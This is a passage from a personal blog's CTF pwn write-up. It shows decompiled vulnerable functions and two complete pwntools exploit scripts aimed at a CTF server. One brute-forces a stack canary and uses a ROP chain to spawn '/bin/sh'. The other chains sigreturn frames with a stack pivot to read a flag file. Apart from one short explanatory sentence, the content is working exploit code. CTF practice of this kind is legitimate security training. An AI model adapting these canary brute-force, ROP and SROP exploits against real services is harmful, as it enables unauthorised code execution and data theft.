<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  __int64 v3; &#x2F;&#x2F; rdx
  pid_t pid; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL, envp);
  setbuf(stdout, 0LL, v3);
  while ( 1 )
  &#123;
    pid &#x3D; fork();
    if ( pid &lt; 0 )
      break;
    if ( pid &lt;&#x3D; 0 )
      vuln();
    else
      wait(0LL);
  &#125;
  return 0;
&#125;
void __cdecl vuln()
&#123;
  char buf[256]; &#x2F;&#x2F; [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v1; &#x2F;&#x2F; [rsp+108h] [rbp-8h]

  v1 &#x3D; __readfsqword(0x28u);
  puts(&quot;please input:&quot;);
  read(0LL, buf, 512LL);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-none"><code class="language-none">from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)

is_debug &#x3D; 1
IP &#x3D; &quot;challenge.qsnctf.com&quot;
PORT &#x3D; 31368

elf &#x3D; context.binary &#x3D; ELF(&#39;.&#x2F;pwn&#39;)
libc &#x3D; elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g &#x3D; lambda x: gdb.attach(x)
s &#x3D; lambda x: p.send(x)
sl &#x3D; lambda x: p.sendline(x)
sa &#x3D; lambda x, y: p.sendafter(x, y)
sla &#x3D; lambda x, y: p.sendlineafter(x, y)
r &#x3D; lambda x&#x3D;None: p.recv() if x is None else p.recv(x)
rl &#x3D; lambda: p.recvline()
ru &#x3D; lambda x: p.recvuntil(x)
r_leak_libc_64 &#x3D; lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 &#x3D; lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

p &#x3D; connect()

rdi &#x3D; 0x00000000004018c2
rsi &#x3D; 0x000000000040f23e
rdx &#x3D; 0x00000000004017cf
rax &#x3D; 0x00000000004493d7 # pop rax ret
ret &#x3D; 0x0000000000445613 #: sub rax, 1 ; ret

syscall &#x3D; 0x00000000004012d3
read &#x3D; 0x000000000448920 

puts &#x3D; 0x411770

canary &#x3D; b&#39;\x00&#39;

for i in range(7):
    for j in range(256):

        print(f&quot;Trying byte &#123;i+1&#125; with value &#123;j&#125;&quot;)

        payload &#x3D; b&#39;a&#39; * (0x110 - 0x8) + canary + bytes([j])
        

        ru(&quot;please input:\n&quot;)
        s(payload)
        line &#x3D; p.recvline().strip()
        if b&#39;please&#39; in line:
            canary &#x3D; canary  + bytes([j])
            print(f&quot;Found byte &#123;i+1&#125;: &#123;canary.hex()&#125;&quot;)
            sl(&quot;AAA&quot;)
            break

success(canary)


bss &#x3D; 0x4c1000

payload &#x3D; b&#39;a&#39; * (0x110 - 0x8) + canary + b&#39;a&#39; * 8
payload +&#x3D; p64(rdi) + p64(0) + p64(rsi) + p64(bss) + p64(rdx) + p64(0x8)
payload +&#x3D; p64(read)

payload +&#x3D; p64(rdi) + p64(bss)
payload +&#x3D; p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(rax) + p64(0x3b)
payload +&#x3D; p64(syscall)


ru(&quot;please input:\n&quot;)

# gdb.attach(p)
s(payload)

time.sleep(0.1)
s(b&quot;&#x2F;bin&#x2F;sh\x00&quot;)


p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="srop-seccomp"><a href="#srop-seccomp" class="headerlink" title="srop_seccomp"></a>srop_seccomp</h2><pre class="line-numbers language-none"><code class="language-none">__int64 vuln()
&#123;
    char v1[10]; &#x2F;&#x2F; [rsp+6h] [rbp-2Ah] BYREF
    _QWORD v2[4]; &#x2F;&#x2F; [rsp+10h] [rbp-20h] BYREF

    v2[0] &#x3D; &#39;onk u oD&#39;;
    v2[1] &#x3D; &#39;i tahw w&#39;;
    v2[2] &#x3D; &#39;\n?DIUS s&#39;;
    strcpy(v1, &quot;easyhack\n&quot;);
    syscall(1LL, 1LL, v1, 9LL);
    syscall(0LL, 0LL, &amp;unk_404060, 4096LL);
    syscall(1LL, 1LL, v2, 24LL);
    syscall(0LL, 0LL, v1, 0x3ALL);
    return 0LL;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有两个片段，配合起来可以实现srop，第一次read布置srop + syscall function实现的orw,第二次read 栈迁移过去执行就好了</p>
<pre class="line-numbers language-none"><code class="language-none">.text:0000000000401186                               ; void sub_401186()
.text:0000000000401186                               sub_401186 proc near
.text:0000000000401186                               ; __unwind &#123;
.text:0000000000401186 55                            push    rbp
.text:0000000000401187 48 89 E5                      mov     rbp, rsp
.text:000000000040118A 0F 05                         syscall                                 ; LINUX -
.text:000000000040118C 90                            nop
.text:000000000040118D 5D                            pop     rbp
.text:000000000040118E C3                            retn
.text:000000000040118E                               ; &#125; &#x2F;&#x2F; starts at 401186
.text:000000000040118E
.text:000000000040118E                               sub_401186 endp
.text:000000000040118E
.text:000000000040118F
.text:000000000040118F                               ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
.text:000000000040118F
.text:000000000040118F                               ; Attributes: bp-based frame
.text:000000000040118F
.text:000000000040118F                               sub_40118F proc near
.text:000000000040118F                               ; __unwind &#123;
.text:000000000040118F 55                            push    rbp
.text:0000000000401190 48 89 E5                      mov     rbp, rsp
.text:0000000000401193 48 C7 C0 0F 00 00 00          mov     rax, 0Fh
.text:000000000040119A C3                            retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-none"><code class="language-none">from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)

is_debug &#x3D; 1
IP &#x3D; &quot;challenge.qsnctf.com&quot;
PORT &#x3D; 32685

elf &#x3D; context.binary &#x3D; ELF(&#39;.&#x2F;chall&#39;)
libc &#x3D; elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g &#x3D; lambda x: gdb.attach(x)
s &#x3D; lambda x: p.send(x)
sl &#x3D; lambda x: p.sendline(x)
sa &#x3D; lambda x, y: p.sendafter(x, y)
sla &#x3D; lambda x, y: p.sendlineafter(x, y)
r &#x3D; lambda x&#x3D;None: p.recv() if x is None else p.recv(x)
rl &#x3D; lambda: p.recvline()
ru &#x3D; lambda x: p.recvuntil(x)
r_leak_libc_64 &#x3D; lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 &#x3D; lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

p &#x3D; connect()

mov_rax_0xf &#x3D; 0x000000000401193
syscall &#x3D; 0x000000000040118a
leave_ret &#x3D; 0x000000000040136c
bss &#x3D; 0x404000
input_data_addr &#x3D; 0x404060

payload &#x3D; p64(mov_rax_0xf) + p64(syscall)


# syscall chmod
sigframe &#x3D; SigreturnFrame()
sigframe.rax &#x3D; 2
sigframe.rdi &#x3D; input_data_addr + 0x600
sigframe.rsi &#x3D; 0
sigframe.rsp &#x3D; 0x404168
sigframe.rip &#x3D; syscall
payload +&#x3D; bytes(sigframe)
# syscall open
sigframe &#x3D; SigreturnFrame()
sigframe.rax &#x3D; 0
sigframe.rdi &#x3D; 3
sigframe.rsi &#x3D; bss
sigframe.rdx &#x3D; 0x40
sigframe.rsp &#x3D; 0x404278
sigframe.rip &#x3D; syscall
payload +&#x3D; b&#39;bbbbbbbb&#39;
payload +&#x3D; p64(mov_rax_0xf) + p64(syscall)
payload +&#x3D; bytes(sigframe)

# syscall read
sigframe &#x3D; SigreturnFrame()
sigframe.rax &#x3D; 1
sigframe.rdi &#x3D; 1
sigframe.rsi &#x3D; bss
sigframe.rdx &#x3D; 0x40
sigframe.rsp &#x3D; 0x404388
sigframe.rip &#x3D; syscall
payload +&#x3D; b&#39;cccccccc&#39;
payload +&#x3D; p64(mov_rax_0xf) + p64(syscall)
payload +&#x3D; bytes(sigframe)

payload &#x3D; payload.ljust(0x600,b&#39;a&#39;)
payload +&#x3D; b&#39;.&#x2F;flag\x00\x00&#39;

sla(&quot;easyhack&quot;,payload)

payload &#x3D; b&#39;a&#39; * 0x2a + p64(input_data_addr - 0x8) + p64(leave_ret)
sa(&quot;Do u know what is SUID?&quot;,payload)

# sleep(2)



p.interactive()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/05/30/xctf-BuggyAllocator复现/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/05/23/xv6-and-unix-utilities/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-05-27 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>52</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ez-quiz"><span class="toc-article-text">ez_quiz</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#stack"><span class="toc-article-text">stack</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#canary"><span class="toc-article-text">canary</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#srop-seccomp"><span class="toc-article-text">srop_seccomp</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
